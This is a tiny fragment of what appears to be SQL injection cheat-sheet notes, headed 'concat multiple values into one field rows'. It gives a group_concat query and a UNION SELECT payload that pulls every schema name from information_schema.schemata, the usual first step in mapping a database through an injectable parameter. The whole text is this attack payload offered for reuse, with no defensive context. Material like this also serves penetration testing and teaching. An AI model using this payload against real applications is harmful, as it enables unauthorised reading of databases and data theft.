### concat multiple values into one field rows
`group_concat( query )`
`... union select 1,2,group_concat(schema_name) from information_schema.schemata`

